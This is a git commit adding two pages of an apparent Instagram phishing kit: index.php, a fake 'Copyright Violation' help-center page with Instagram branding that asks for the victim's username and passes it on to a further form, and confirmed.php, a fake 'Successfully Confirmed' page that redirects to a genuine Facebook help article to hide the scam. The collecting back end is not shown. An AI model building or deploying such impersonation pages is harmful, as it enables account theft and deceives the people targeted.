145438a45b0f54c5666005ab65437dbe457eda1d
wozlyy <67782280+wozlyy@users.noreply.github.com>
2020-07-03 11:59:26 +0300

    Add files via upload

---
+++ confirmed.php
@@ -0,0 +1,61 @@
+<?php
+
+
+
+
+header("refresh:5;url=https://www.facebook.com/help/instagram/693132910771176");
+
+
+?>
+
+
+<html>
+  <head>
+  <meta charset="utf-8">
+  <title>Succesfully Confirmed!</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="shortcut icon" href="https://www.resimag.com/p1/87ae1ad3604.png">
+  </head>
+  
+  <body style="padding:0px; margin:0px; background: #fafafa;">
+ 
+ <div style="margin:0px; padding:0px; background:white;border-bottom:1px solid #dedede; width:100%;">
+
+ <img src="https://resimag.com/p1/819f2f28aae.png" width=175 style="margin:6px;"><br><br>
+ 
+         </div>
+		 <center>
+		 <br><br><br>
+		<div style="padding:0px; margin:0px; width:89%; background-color:white; border:1px solid #cecece;">
+	<br>	<img src="https://www.resimag.com/p1/5dbb3aaf8ee.png" width=100 style="border-radius:50%;">
+		<br><br>
+		<h1 style="font-size:25px; width:99%;font-family:sans-serif;font-weight:400; ">Succesfully Confirmed!
+		</h1>
+		
+		<p style="font-family:sans-serif;color:#555; width:89%;" >
+		Thank you for contacting us. Your application has 
+		been approved. We will contact you as soon as possible.
+		</p>
+		</div>
+		 
+		 
+		 
+		  <div style="font-family:sans-serif; font-size:14px; color:#999;"><br>
+Instagram From Facebook
+<br>
+ © Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025</div>
+		 
+		 
+		 
+		 
+		 
+		 
+  </center>
+  </body>
+  
+  
+
+
+
+
+</html>
---
+++ index.php
@@ -0,0 +1,106 @@
+
+    <html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Copyright | Help Center</title>
+<link rel="icon" href="https://www.resimag.com/p1/87ae1ad3604.png">
+<style>
+#copyright{
+color:#999;}
+#menu{
+
+
+width:91%;
+} 
+
+#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
+#asdxyz{
+background-color:white;
+width:91%;
+}
+#erhanasd{
+font-family:sans-serif;
+font-weight:400;
+letter-spacing:;
+color:#3d3d3d;
+font-size:23px;}
+#qenzyne{
+width:60%;
+color:#999;
+font-family:sans-serif;
+}
+#nick{
+background-color:#fafafa;
+border:1px solid #cecece;
+outline:none;
+border-radius:6px;
+width:220px;
+height:35px;
+text-align:center;
+font-size:16px;}
+
+#butonbey{
+color:white;
+background-color:#3897f0;
+font-size:17px;
+
+border-radius:5px;
+outline:none;
+font-family:sans-serif;
+font-weight:540;
+border:0;
+width:170px;
+height:30px;
+font-weight:bold;
+
+}
+#nick:hover{
+
+    border:1px solid #cecece;
+    width:310px;
+    max-width:80%;
+
+}
+</style>
+</head>     
+
+<body>
+<body bgcolor="#fafafa">
+<br>
+<br>
+<br>
+<center>
+<form method="get" action="form.php">
+<div id="asdxyz" style="border:1px solid #cecece;">
+
+<img src="https://resimag.com/p1/c99444d19ff.jpeg" width=200>
+
+<h1 id="erhanasd">Copyright  Vioalation</h1>
+
+<p id="qenzyne">Please write your instagram username and click "Next" and fill the next form  </p><br>
+
+
+
+<input type="text" id="nick" name="nick" required="" placeholder="@username" class="qua21"><br><br>
+<input type="submit" value="Next" id="butonbey" style="">
+</form>
+
+<br><br>
+</div>
+</center>
+<center><br> <br>
+
+<div id="get">
+<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
+<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
+</div>
+<br><br><br>
+<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;"> Instagram from Facebook </p>
+<br>
+
+</center>
+
+</body>
+
+</html>
